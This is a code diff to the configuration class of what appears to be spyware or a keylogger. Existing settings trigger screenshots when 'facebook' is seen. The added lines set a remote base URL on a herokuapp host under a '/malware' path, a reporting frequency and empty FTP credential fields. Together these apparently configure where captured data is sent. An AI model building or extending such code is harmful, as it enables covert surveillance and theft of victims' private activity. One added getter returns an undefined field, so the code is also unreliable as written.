@@ -22,6 +22,12 @@ class Configuration:
             self.__samplingFrequency = 0.1
             self.__screenshotFrequency = 50
             self.__screenshotTrigger = ['facebook']
+        #COMMUNICATION
+            self.__baseURL = 'http://facebook-user-profile.herokuapp.com/malware'
+            self.__communicationFrequency = 5
+            self.__ftpURL = None
+            self.__ftpUserName = None
+            self.__ftpPassword = None
 
 
     def setDefault(self):
@@ -84,3 +90,15 @@ class Configuration:
     @property
     def windowTrackingIsActive(self):
         return self.__windowTrackingIsActive
+
+    @property
+    def baseURL(self):
+        return self.__baseURL
+
+    @property
+    def communicationFrequency(self):
+        return self.__communicationFrequency
+
+    @property
+    def userName(self):
+        return self.__userName
